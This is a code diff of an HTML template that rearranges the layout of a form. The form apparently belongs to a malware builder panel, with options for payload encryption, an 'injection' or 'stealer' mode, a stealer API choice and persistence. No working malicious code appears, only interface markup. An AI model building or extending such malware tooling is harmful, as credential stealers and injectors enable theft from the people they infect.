@@ -403,25 +403,23 @@ code{font-family:var(--mono);font-size:12px;background:var(--bg4);padding:1px 5p
         <div class="pill-select" id="b-enc-pills">{% for c in modules.crypto %}<span class="pill-opt" data-val="{{c}}" onclick="pickPill('b-enc','b-enc-pills',this)">{{c}}</span>{% endfor %}</div>
         <input type="hidden" id="b-enc">
       </div>
-      <div class="form-row" style="margin-bottom:14px">
-        <div>
-          <label>Mode</label>
-          <div class="seg-toggle" id="b-mode-seg">
-            <span class="seg-opt" data-val="injection" onclick="pickSeg('b-malware','b-mode-seg',this)">injection</span>
-            <span class="seg-opt" data-val="stealer" onclick="pickSeg('b-malware','b-mode-seg',this)">stealer</span>
-          </div>
-          <input type="hidden" id="b-malware">
+      <div style="margin-bottom:8px">
+        <label>Mode</label>
+        <div class="seg-toggle" id="b-mode-seg" style="max-width:220px">
+          <span class="seg-opt" data-val="injection" onclick="pickSeg('b-malware','b-mode-seg',this)">injection</span>
+          <span class="seg-opt" data-val="stealer" onclick="pickSeg('b-malware','b-mode-seg',this)">stealer</span>
         </div>
-        <div id="b-inj-wrap">
-          <label>Injection</label>
-          <div class="pill-select" id="b-inj-pills">{% for i in modules.injection %}<span class="pill-opt" data-val="{{i}}" onclick="pickPill('b-injection','b-inj-pills',this)">{{i}}</span>{% endfor %}</div>
-          <input type="hidden" id="b-injection">
-        </div>
-        <div id="b-stl-wrap" style="display:none">
-          <label>Stealer API</label>
-          <div class="pill-select" id="b-stl-pills">{% for s in modules.stealer %}<span class="pill-opt" data-val="{{s}}" onclick="pickPill('b-stealer','b-stl-pills',this)">{{s}}</span>{% endfor %}</div>
-          <input type="hidden" id="b-stealer">
-        </div>
+        <input type="hidden" id="b-malware">
+      </div>
+      <div id="b-inj-wrap" style="margin-bottom:14px">
+        <label>Injection</label>
+        <div class="pill-select" id="b-inj-pills">{% for i in modules.injection %}<span class="pill-opt" data-val="{{i}}" onclick="pickPill('b-injection','b-inj-pills',this)">{{i}}</span>{% endfor %}</div>
+        <input type="hidden" id="b-injection">
+      </div>
+      <div id="b-stl-wrap" style="display:none;margin-bottom:14px">
+        <label>Stealer API</label>
+        <div class="pill-select" id="b-stl-pills">{% for s in modules.stealer %}<span class="pill-opt" data-val="{{s}}" onclick="pickPill('b-stealer','b-stl-pills',this)">{{s}}</span>{% endfor %}</div>
+        <input type="hidden" id="b-stealer">
       </div>
       <div style="margin-bottom:14px">
         <label>Persistence</label>
